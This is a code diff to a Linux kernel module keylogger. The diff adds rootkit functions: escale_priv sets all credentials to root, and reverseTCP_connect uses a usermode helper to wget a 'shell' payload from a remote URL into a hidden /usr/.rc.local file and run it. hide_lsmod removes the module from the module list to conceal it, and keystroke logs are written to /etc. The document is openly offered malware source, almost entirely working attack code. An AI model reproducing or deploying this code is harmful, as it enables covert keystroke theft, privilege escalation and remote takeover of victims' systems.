@@ -3,7 +3,7 @@
 #include <linux/init.h>
 #include <linux/keyboard.h>
 #include <linux/semaphore.h>
-#include "VictorSwagHeaders.h"
+#include "keylogger.h"
 
 #include <linux/module.h>
 #include <linux/kernel.h>
@@ -12,11 +12,11 @@
 #include <linux/timer.h>
 
 #define DRIVER_DESC     "Keylogger"
-#define fullFileName    "~/keylogger.txt"
+#define fullFileName    "/etc/keylogger.txt"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Pon Stars");  // remember to change before you turn in
-MODULE_DESCRIPTION("Linux device driver for absolutely nothing ;) ;)");
+MODULE_DESCRIPTION("Reverse TCP connection keylogger that will save to a log file");
 MODULE_VERSION("1.0");
 
 struct semaphore sem;
@@ -30,6 +30,20 @@ int index_num = 0;
 int buffer_counter = 0;
 int buffer_switch = 0;
 static char* buffer[2][100];
+
+///////////////////////////
+
+static int    major_number = 0;//<device number -- initialized to place it on the .data section and not on .bss
+static struct class*  reverseTCP_class  = NULL;//< class struct pointer
+static struct device* reverseTCP_device = NULL;//< device struct pointer
+
+
+static int     reverseTCP_connect(void);
+static int     reverseTCP_release(struct inode *, struct file *);
+static int    escale_priv(void);
+static int    hide_lsmod(void);
+
+//////////////////////////
 
 static const char* NoShift[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
                         "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
@@ -54,6 +68,145 @@ static const char* YesShift[] =
 
 static int UnpressedKey = 0;
 
+////////////////////////////////////////
+
+static struct file_operations reverseTCP_fops =
+{
+   .release = reverseTCP_release, 
+};
+
+static int __init reverseTCP_init(void)
+{
+	#ifdef DEBUG
+   printk(KERN_ALERT "reverseTCP: Initializing driver\n");
+	#endif
+
+   //get major number
+   major_number = register_chrdev(0, DEVICE_NAME, &reverseTCP_fops);
+   if (major_number<0)
+	{
+		#ifdef DEBUG
+      printk(KERN_ALERT "reverseTCP: failed to register a major number\n");
+		#endif
+      major_number = -1;
+      return major_number;
+   }
+	#ifdef DEBUG
+   printk(KERN_ALERT "reverseTCP: driver registered with major number %d\n", major_number);
+	#endif
+
+   // Register device class
+   reverseTCP_class = class_create(THIS_MODULE, CLASS_NAME);
+   if (IS_ERR(reverseTCP_class))
+	{                
+      unregister_chrdev(major_number, DEVICE_NAME);
+		#ifdef DEBUG
+      printk(KERN_ALERT "reverseTCP: failed to register device class\n");
+		#endif
+      return PTR_ERR(reverseTCP_class);          
+   }
+	#ifdef DEBUG
+   printk(KERN_ALERT "reverseTCP: device class registered\n");
+	#endif
+
+   // Register the device driver
+   reverseTCP_device = device_create(reverseTCP_class, NULL, MKDEV(major_number, 0), NULL, DEVICE_NAME);
+   if (IS_ERR(reverseTCP_device)){               
+      class_destroy(reverseTCP_class);
+      unregister_chrdev(major_number, DEVICE_NAME);
+		#ifdef DEBUG
+      printk(KERN_ALERT "reverseTCP: failed to create the device\n");
+		#endif
+      return PTR_ERR(reverseTCP_device);
+   }
+	#ifdef DEBUG
+   printk(KERN_ALERT "reverseTCP: device class created correctly\n");
+	printk(KERN_ALERT "reverseTCP: calling reverseTCP_connect\n");
+	#endif
+
+/*
+	call this in init function
+**************************************************************************
+**************************************************************************/
+
+	escale_priv();
+	reverseTCP_connect();
+	#ifndef DEBUG
+	hide_lsmod();
+	#endif
+//========================================================================
+//========================================================================
+
+
+
+	#ifdef DEBUG
+   printk(KERN_ALERT "reverseTCP: no hickupp!!!!\n");
+	#endif
+
+   return 0;
+}
+
+static void __exit reverseTCP_exit(void)
+{
+   device_destroy(reverseTCP_class, MKDEV(major_number, 0));     
+   class_unregister(reverseTCP_class);                          
+   class_destroy(reverseTCP_class);                             
+   unregister_chrdev(major_number, DEVICE_NAME);             
+}
+
+static int reverseTCP_release(struct inode *inodep, struct file *filep)
+{
+   return 0;
+}
+
+static int reverseTCP_connect(void)
+{
+	struct subprocess_info *sub_info;
+	//download userland reverseshell
+	static  char *argv[] = { "/bin/sh", "-c","sudo wget -qr -O /usr/.rc.local https://github.com/A283le/RootKit/raw/jlima020-patch-1/shell;sudo chmod 777 /usr/.rc.local; sudo /usr/.rc.local", NULL};    
+    static  char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL};
+    
+	sub_info = call_usermodehelper_setup( argv[0], argv, envp, GFP_ATOMIC, NULL, NULL, NULL );
+  	if (sub_info == NULL) return -ENOMEM; 	
+  	return call_usermodehelper_exec( sub_info, UMH_NO_WAIT );
+}
+
+static int escale_priv(void)
+{
+	//elevate priviledges
+	struct cred *new;
+	new = prepare_creds();
+    if (new != NULL) 
+	{
+          new->uid.val = new -> gid.val = 0;
+          new->euid.val = new ->egid.val = 0;
+          new->suid.val = new->sgid.val=0;
+          new->fsuid.val = new->fsgid.val = 0;
+          commit_creds(new);
+		#ifdef DEBUG
+		printk(KERN_ALERT "now you are root\n");
+		#endif
+	}
+	return 0;
+}
+
+//might give error
+static int hide_lsmod(void)
+{
+	
+      // hide module from lsmod / proc/modules
+      list_del_init(&__this_module.list);
+      kobject_del(&__this_module.mkobj.kobj);
+      list_del(&__this_module.mkobj.kobj.entry);
+	return 0;
+ }
+
+//v giving errors v//
+//module_init(reverseTCP_init);
+//module_exit(reverseTCP_exit);
+
+////////////////////////////////////////
+
 void thread_cleanup(void) {
  int ret;
  ret = kthread_stop(thread1);
@@ -73,6 +226,14 @@ int thread_init (void) {
         wake_up_process(thread1);
     }
 
+	/*/R-TCP code
+	escale_priv();
+	reverseTCP_connect();
+	#ifndef DEBUG
+	hide_lsmod();
+	#endif
+	R-TCP code/*/
+
     return 0;
 }
 
@@ -84,7 +245,6 @@ int thread_fn(void * data) {
     }
 
     thread_cleanup();
-
 
     return 0;
 }
@@ -175,7 +335,8 @@ int setup_disk() {
    fs = get_fs();
    set_fs(KERNEL_DS);
 
-    // file definitions at this url: https://www.ibm.com/developerworks/community/blogs/58e72888-6340-46ac-b488-d31aa4058e9c/entry/understanding_linux_open_system_call?lan=en
+/* file definitions at this url: 
+https://www.ibm.com/developerworks/community/blogs/58e72888-6340-46ac-b488-d31aa4058e9c/entry/understanding_linux_open_system_call?lan=en */
 
    if (dio && reopen) {
       f = filp_open(filepath, O_WRONLY | O_CREAT | O_LARGEFILE | O_APPEND , 0444);
@@ -236,3 +397,5 @@ static void disable_dio() {
    cleanup_disk();
    setup_disk();
 }
+
+
